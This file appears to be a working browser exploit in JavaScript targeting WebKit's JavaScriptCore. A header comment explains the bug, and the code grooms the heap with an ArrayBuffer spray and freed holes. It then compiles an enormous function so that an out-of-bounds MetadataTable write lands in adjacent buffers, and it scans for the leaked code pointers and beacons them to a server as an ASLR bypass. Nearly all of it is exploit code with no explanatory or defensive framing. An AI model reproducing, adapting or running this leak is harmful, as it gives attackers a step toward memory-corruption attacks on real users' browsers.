// p150f — MetadataTable overflow: COMPILE-TIME ASLR leak
//
// Key insight: finishCreation() iterates ALL 38M instructions and calls
// BaselineCallLinkInfo::initialize() for each, writing m_slowPathCallDestination
// (= vm.getCTILinkCall().code(), a WebKit code pointer) at offset 24 within
// each 112-byte entry. For OOB entries (894+), this writes into whatever
// heap memory follows the MetadataTable buffer.
//
// Approach: bait-and-switch
// 1. Spray 300 × 100096B ArrayBuffers (same size as MetadataTable)
// 2. Free even-indexed buffers → create 150 holes
// 3. Compile 38M function → MetadataTable fills one hole
// 4. finishCreation OOB writes go into adjacent OCCUPIED spray buffer
// 5. Read spray buffers → find code pointer at offset 56 (32+24), stride 112
//
// NO function call needed! No GC crash risk! No slow-path issues!
//
// Beacon prefix: V150F-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150F-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  BS('BOOT');

  var BUF_SZ = 100096;
  var SPRAY_COUNT = 300;

  var sprays = [];
  var views = [];

  // ---- PHASE 1: Spray ----
  BS('SPRAY-START');
  for (var i = 0; i < SPRAY_COUNT; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    sprays.push(ab);
    views.push(new Uint8Array(ab));
  }
  BS('SPRAY-' + SPRAY_COUNT);

  // ---- PHASE 2: Free even-indexed buffers to create holes ----
  BS('FREE-START');
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    sprays[i] = null;
    views[i] = null;
  }
  BS('FREE-DONE');

  // Force GC to reclaim freed ArrayBuffer backing stores
  // Need full collection + sweep for libpas to get the slots back
  for (var g = 0; g < 8; g++) {
    var garbage = new Array(50000);
    for (var j = 0; j < 50000; j++) garbage[j] = new ArrayBuffer(256);
    garbage = null;
  }
  BS('GC-FORCED');

  // Count surviving spray buffers
  var oddAlive = 0, evenAlive = 0;
  for (var c = 0; c < views.length; c++) {
    if (views[c]) { if (c % 2) oddAlive++; else evenAlive++; }
  }
  BS('PRE-COMPILE-odd' + oddAlive + '-even' + evenAlive);

  // ---- PHASE 3: Compile the 38M function ----
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p150fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p150ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p150ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') setTimeout(phaseScan, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  // ---- PHASE 4: Scan surviving spray buffers for OOB writes ----
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function anyNonZero(view, off, len) {
    for (var b = 0; b < len; b++) { if (view[off + b] !== 0) return true; }
    return false;
  }

  function phaseScan() {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    // Scan odd-indexed buffers first (bait-and-switch targets), then even (fallback)
    var scanOrder = [];
    for (var s = 1; s < views.length; s += 2) scanOrder.push(s);
    for (var s = 0; s < views.length; s += 2) scanOrder.push(s);

    for (var si = 0; si < scanOrder.length; si++) {
      var i = scanOrder[si];
      var view = views[i];
      if (!view) continue;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 3) {
          BS('HIT-' + i + '-nz' + nz + '-f' + firstOff);
        }

        // Adaptive stride detection: find entry base from firstOff
        // OOB entries start at some offset 0-111 and repeat at 112B stride
        // The entry base = firstOff aligned down to start of 112B entry
        // Try: base = firstOff, then scan at +112 stride. If second entry
        // also has data → confirmed stride.
        var entryBase = firstOff;
        if (entryBase + 112 < view.length && !anyNonZero(view, entryBase + 112, 8)) {
          entryBase = firstOff - (firstOff % 112);
        }
        BS('EBASE-' + i + '-' + entryBase);

        // Scan at stride 112 from entryBase
        // m_slowPathCallDestination at entry+24 (8 bytes, code pointer)
        // m_slowPathCount at entry+12 (4 bytes, should be 0xFFFFFFFF)
        // m_bytecodeIndex at entry+68 (4 bytes, instruction index)
        var ptrsDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && ptrsDumped < 10; entryOff += 112) {
          var ptrOff = entryOff + 24;
          if (ptrOff + 8 > view.length) break;

          if (!anyNonZero(view, ptrOff, 8)) continue;

          var hex = readHex8(view, ptrOff);
          var entryN = Math.round((entryOff - entryBase) / 112);
          BS('THUNK-N' + entryN + '-O' + ptrOff + '=' + hex);
          ptrsDumped++;

          if (leakedPtrs.length < 5) leakedPtrs.push(hex);
        }

        // Check m_slowPathCount and m_bytecodeIndex for first few entries
        var diagDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && diagDumped < 5; entryOff += 112) {
          var entryN = Math.round((entryOff - entryBase) / 112);

          var cntOff = entryOff + 12;
          if (cntOff + 4 <= view.length) {
            var cnt = readU32(view, cntOff);
            if (cnt !== 0) {
              BS('CNT-N' + entryN + '=' + cnt.toString(16));
              diagDumped++;
            }
          }

          var idxOff = entryOff + 68;
          if (idxOff + 4 <= view.length) {
            var val = readU32(view, idxOff);
            if (val !== 0) {
              BS('IDX-N' + entryN + '=' + val);
              diagDumped++;
            }
          }
        }

        // Dump first 512 bytes raw for the first hit buffer
        if (hitBufs === 1) {
          var chunks = '';
          var cc = 0;
          for (var off = 0; off + 8 <= 512 && off + 8 <= view.length; off += 8) {
            if (anyNonZero(view, off, 8) && cc < 20) {
              chunks += off + ':' + readHex8(view, off) + ' ';
              cc++;
            }
          }
          if (cc > 0) BS('RAW-' + i + '-' + chunks.trim());
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ);

    if (hitBufs > 0 && leakedPtrs.length > 0) {
      BS('ASLR-LEAK');
      for (var p = 0; p < leakedPtrs.length; p++) {
        BS('PTR' + p + '=' + leakedPtrs[p]);
      }
    } else {
      BS('NO-LEAK');
    }

    BS('DONE');
  }
})();
